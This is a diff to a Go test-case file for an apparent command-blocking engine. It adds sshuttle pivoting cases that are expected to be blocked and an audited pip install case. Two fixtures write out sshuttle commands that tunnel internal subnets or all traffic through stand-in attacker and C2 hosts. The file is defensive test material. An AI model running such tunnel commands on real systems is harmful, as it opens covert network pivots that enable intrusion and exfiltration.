@@ -1085,6 +1085,27 @@ var SSHTunnelCases = []TestCase{
 		Description:      "Background SOCKS proxy daemon using combined flags -fND on external host.",
 		Tags:             []string{"tp", "ssh-tunnel", "socks", "proxy"},
 	},
+	// --- True Positives: sshuttle VPN-over-SSH pivoting ---
+	{
+		ID:               "TP-NE-BLOCK-SSHUTTLE-001",
+		Command:          "sshuttle -r user@attacker.com 10.0.0.0/8",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "structural",
+		Description:      "sshuttle routing internal 10.x.x.x subnet through attacker-controlled host — full network pivot.",
+		Tags:             []string{"tp", "sshuttle", "vpn", "pivot"},
+	},
+	{
+		ID:               "TP-NE-BLOCK-SSHUTTLE-002",
+		Command:          "sshuttle -D -r user@c2.attacker.com 0.0.0.0/0",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "structural",
+		Description:      "sshuttle daemon mode routing ALL traffic through C2 host — persistent full-network pivot.",
+		Tags:             []string{"tp", "sshuttle", "vpn", "pivot", "daemon"},
+	},
 	// --- True Negatives: legitimate SSH usage ---
 	{
 		ID:               "TN-NE-SSH-TUNNEL-001",
@@ -1115,6 +1136,16 @@ var SSHTunnelCases = []TestCase{
 		Analyzer:         "regex",
 		Description:      "SSH with verbose flag for debugging — -v is not a port forwarding flag.",
 		Tags:             []string{"tn", "safe", "ssh"},
+	},
+	{
+		ID:               "TN-NE-SSHUTTLE-001",
+		Command:          "pip install sshuttle",
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "structural",
+		Description:      "Installing sshuttle via pip — installation is audited, not blocked; blocking is for execution.",
+		Tags:             []string{"tn", "safe", "sshuttle"},
 	},
 }
 
